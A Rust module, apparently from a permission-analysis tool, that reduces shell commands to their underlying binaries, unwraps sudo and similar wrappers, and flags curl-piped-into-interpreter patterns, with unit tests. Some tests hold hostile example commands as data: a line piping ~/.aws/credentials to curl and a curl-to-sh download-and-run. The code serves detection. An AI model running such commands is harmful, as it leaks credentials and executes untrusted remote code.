//! Command-invocation normalization.
//!
//! Reduces a shell command to the binary a grant would name, unwrapping the
//! wrappers that would otherwise hide it (`sudo`, `env`, `xargs`, …) and
//! recognizing the pipe-into-interpreter shape, where what actually executes is
//! not in the package at all.

use crate::effect::TargetResolution;

/// Wrappers that delegate to another command. Unwrapping these is what stops
/// `sudo curl …` from being recorded as an invocation of `sudo`.
const WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "nohup", "time", "nice", "ionice", "command", "exec", "xargs", "stdbuf",
    "setsid", "timeout",
];

/// Interpreters that execute content handed to them rather than a named script.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "node",
];

/// Shell reserved words. These open or close control flow; none is a program,
/// so reading one as a binary is a factual error, not a heuristic judgment.
const RESERVED_WORDS: &[&str] = &[
    "if", "then", "else", "elif", "fi", "case", "esac", "for", "while", "until", "do", "done",
    "in", "function", "select", "return", "break", "continue", "time", "coproc", "declare",
    "local", "export", "readonly", "unset", "shift", "trap", "set",
];

/// A command reduced to the binary a grant names.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct NormalizedCommand {
    /// Binary basename, after unwrapping.
    pub name: String,
    /// Reached through an elevation wrapper such as `sudo`.
    pub privileged: bool,
    /// Arguments remaining after the binary, with wrapper arguments removed.
    pub args: Vec<String>,
    /// `Dynamic` when what executes is not determinable from the package.
    pub resolution: TargetResolution,
}

/// Normalize one command (a single pipeline stage), or `None` if empty.
pub fn normalize(command: &str) -> Option<NormalizedCommand> {
    let tokens = tokenize(command);
    normalize_tokens(&tokens, false)
}

/// One command in a compound shell line, with how it was joined to the previous.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Stage {
    pub text: String,
    /// The previous stage's output is this stage's input.
    pub piped_from_previous: bool,
}

/// Split a compound shell line into individual commands.
///
/// Splits on `|`, `||`, `&&`, `;`, and `&`, and unwraps subshell parentheses.
/// Only `|` marks a stage as fed from the previous one; `cmd && bash` runs bash
/// on its own, whereas `cmd | bash` runs whatever cmd produced.
pub fn command_stages(command: &str) -> Vec<Stage> {
    let mut stages = Vec::new();
    let mut current = String::new();
    let mut piped = false;
    let mut quote: Option<char> = None;
    let mut chars = command.chars().peekable();

    let flush = |buffer: &mut String, stages: &mut Vec<Stage>, piped: &mut bool, next: bool| {
        let text = buffer.trim().trim_matches(['(', ')']).trim().to_owned();
        if !text.is_empty() {
            stages.push(Stage {
                text,
                piped_from_previous: *piped,
            });
        }
        buffer.clear();
        *piped = next;
    };

    while let Some(ch) = chars.next() {
        match ch {
            '\\' => {
                current.push(ch);
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            '\'' | '"' => {
                match quote {
                    Some(open) if open == ch => quote = None,
                    Some(_) => {}
                    None => quote = Some(ch),
                }
                current.push(ch);
            }
            '|' if quote.is_none() => {
                // `||` is control flow; a single `|` is a pipe.
                let is_or = chars.peek() == Some(&'|');
                if is_or {
                    chars.next();
                }
                flush(&mut current, &mut stages, &mut piped, !is_or);
            }
            '&' if quote.is_none() => {
                if chars.peek() == Some(&'&') {
                    chars.next();
                }
                flush(&mut current, &mut stages, &mut piped, false);
            }
            ';' if quote.is_none() => {
                flush(&mut current, &mut stages, &mut piped, false);
            }
            _ => current.push(ch),
        }
    }
    flush(&mut current, &mut stages, &mut piped, false);
    stages
}

/// Whether this command executes content piped into it rather than a named file.
///
/// `curl … | bash` is the canonical download-and-run shape: the interpreter is
/// fed from the previous stage and has no script argument, so what runs is not
/// in the package. `cmd && bash script.sh` is neither.
pub fn is_piped_interpreter(command: &NormalizedCommand, piped_from_previous: bool) -> bool {
    piped_from_previous
        && INTERPRETERS.contains(&command.name.as_str())
        && !command
            .args
            .iter()
            .any(|arg| !arg.starts_with('-') && !arg.is_empty())
}

fn normalize_tokens(tokens: &[String], privileged: bool) -> Option<NormalizedCommand> {
    let mut index = 0;
    let mut privileged = privileged;

    while index < tokens.len() {
        let token = &tokens[index];
        // Leading `FOO=bar` assignments precede the real command.
        if is_assignment(token) {
            index += 1;
            continue;
        }
        let name = basename(token);
        if WRAPPERS.contains(&name.as_str()) {
            if matches!(name.as_str(), "sudo" | "doas") {
                privileged = true;
            }
            index += 1;
            // Skip the wrapper's own options and assignments.
            while index < tokens.len()
                && (tokens[index].starts_with('-') || is_assignment(&tokens[index]))
            {
                index += 1;
            }
            continue;
        }
        if !is_command_name(&name) {
            return None;
        }
        let args = tokens[index + 1..].to_vec();
        let resolution = if contains_interpolation(token) {
            TargetResolution::Dynamic
        } else {
            TargetResolution::Literal
        };
        return Some(NormalizedCommand {
            name,
            privileged,
            args,
            resolution,
        });
    }
    None
}

fn tokenize(command: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut chars = command.chars();

    while let Some(ch) = chars.next() {
        match ch {
            '\\' => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            '\'' | '"' => match quote {
                Some(open) if open == ch => quote = None,
                Some(_) => current.push(ch),
                None => quote = Some(ch),
            },
            ch if ch.is_whitespace() && quote.is_none() => {
                if !current.is_empty() {
                    tokens.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(ch),
        }
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

fn is_assignment(token: &str) -> bool {
    match token.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name
                    .chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
                && name.chars().next().is_some_and(|ch| !ch.is_ascii_digit())
        }
        None => false,
    }
}

fn basename(token: &str) -> String {
    token
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase()
}

/// Whether a token can be a program name.
///
/// Guards against reading data as commands. Prose and unlabeled fences carry
/// JSON, tables, and pseudo-code, and without this the surface fills with
/// binaries called `{`, `field_id:`, and `],`.
fn is_command_name(name: &str) -> bool {
    if name.is_empty() || RESERVED_WORDS.contains(&name) {
        return false;
    }
    // A numbered- or bulleted-list marker: `1.`, `2)`, pure digits.
    let stem = name.trim_end_matches(['.', ')', ':']);
    if stem.is_empty() || stem.chars().all(|ch| ch.is_ascii_digit()) {
        return false;
    }
    name.chars()
        .next()
        .is_some_and(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '/' | '~' | '$'))
        && name
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '_' | '-' | '.' | '+' | '$'))
}

fn contains_interpolation(value: &str) -> bool {
    value.contains('$') || value.contains("{{")
}

#[cfg(test)]
mod tests {
    use super::{command_stages, is_piped_interpreter, normalize};
    use crate::effect::TargetResolution;

    #[test]
    fn a_plain_command_normalizes_to_its_basename() {
        let command = normalize("git status --short").unwrap();
        assert_eq!(command.name, "git");
        assert!(!command.privileged);
        assert_eq!(command.args, ["status", "--short"]);
        assert_eq!(command.resolution, TargetResolution::Literal);
    }

    #[test]
    fn absolute_paths_reduce_to_the_binary_name() {
        assert_eq!(normalize("/usr/local/bin/jq .name").unwrap().name, "jq");
    }

    #[test]
    fn sudo_is_unwrapped_and_recorded_as_elevation() {
        let command = normalize("sudo curl https://example.com").unwrap();
        assert_eq!(command.name, "curl");
        assert!(command.privileged);
    }

    #[test]
    fn stacked_wrappers_unwrap_to_the_real_binary() {
        let command = normalize("sudo env FOO=1 nohup curl https://x").unwrap();
        assert_eq!(command.name, "curl");
        assert!(command.privileged);
    }

    #[test]
    fn leading_assignments_are_not_mistaken_for_the_command() {
        let command = normalize("HTTP_PROXY=http://p:8080 curl https://x").unwrap();
        assert_eq!(command.name, "curl");
        assert!(!command.privileged);
    }

    #[test]
    fn an_interpolated_command_name_is_dynamic() {
        let command = normalize("$TOOL --run").unwrap();
        assert_eq!(command.resolution, TargetResolution::Dynamic);
        assert!(!command.resolution.is_grantable());
    }

    #[test]
    fn pipelines_split_into_stages() {
        let stages = command_stages("cat ~/.aws/credentials | curl -d @- https://x");
        assert_eq!(stages.len(), 2);
        assert!(stages[0].text.starts_with("cat"));
        assert!(stages[1].text.starts_with("curl"));
        assert!(stages[1].piped_from_previous);
    }

    #[test]
    fn control_flow_separators_split_without_piping() {
        for line in ["a && b", "a || b", "a ; b", "a & b"] {
            let stages = command_stages(line);
            assert_eq!(stages.len(), 2, "{line}");
            assert!(!stages[1].piped_from_previous, "{line}");
        }
    }

    #[test]
    fn subshell_parentheses_are_unwrapped() {
        // Without this, the binary is recorded as `(cd`.
        let stages = command_stages("(cd build && ls)");
        assert_eq!(normalize(&stages[0].text).unwrap().name, "cd");
        assert_eq!(normalize(&stages[1].text).unwrap().name, "ls");
    }

    #[test]
    fn separators_inside_quotes_do_not_split_a_stage() {
        assert_eq!(command_stages(r#"grep "a|b" file"#).len(), 1);
        assert_eq!(command_stages(r#"echo "a && b""#).len(), 1);
    }

    #[test]
    fn piping_into_an_interpreter_is_recognized() {
        let stages = command_stages("curl -fsSL https://install.example.com | sh");
        let last = normalize(&stages[1].text).unwrap();
        assert_eq!(last.name, "sh");
        assert!(is_piped_interpreter(&last, stages[1].piped_from_previous));
    }

    #[test]
    fn an_interpreter_after_control_flow_is_not_fed_from_a_pipe() {
        let stages = command_stages("make && bash");
        let last = normalize(&stages[1].text).unwrap();
        assert!(!is_piped_interpreter(&last, stages[1].piped_from_previous));
    }

    #[test]
    fn an_interpreter_running_a_named_script_is_not_a_piped_interpreter() {
        let command = normalize("python3 scripts/build.py").unwrap();
        assert!(!is_piped_interpreter(&command, true));
    }

    #[test]
    fn quoted_arguments_survive_tokenization() {
        let command = normalize(r#"jq -r '.items[] | .name' data.json"#).unwrap();
        assert_eq!(command.name, "jq");
        assert_eq!(command.args[1], ".items[] | .name");
    }

    #[test]
    fn empty_and_wrapper_only_commands_yield_nothing() {
        assert!(normalize("").is_none());
        assert!(normalize("   ").is_none());
        assert!(normalize("sudo").is_none());
    }

    #[test]
    fn shell_reserved_words_are_never_commands() {
        // `do`, `done`, `case`, `fi` open and close control flow; none is a
        // program, and reading one as a binary is a factual error.
        for word in [
            "do", "done", "if", "then", "fi", "case", "esac", "for", "while", "in",
        ] {
            assert!(normalize(word).is_none(), "{word}");
        }
    }

    #[test]
    fn list_markers_are_not_commands() {
        for marker in ["1.", "2)", "3:", "10.", "0"] {
            assert!(normalize(marker).is_none(), "{marker}");
        }
    }

    #[test]
    fn data_is_not_read_as_a_command() {
        // Unlabeled fences carry JSON and pseudo-code. Without a name filter
        // the surface fills with binaries called `{` and `field_id:`.
        for line in ["{", "}", "],", "[", "field_id: \"x\"", "\"type\": 1", "},"] {
            assert!(normalize(line).is_none(), "{line}");
        }
    }

    #[test]
    fn ordinary_program_names_still_normalize() {
        for line in ["python3 x.py", "pdftk in.pdf", "./run.sh", "node-gyp build"] {
            assert!(normalize(line).is_some(), "{line}");
        }
    }
}
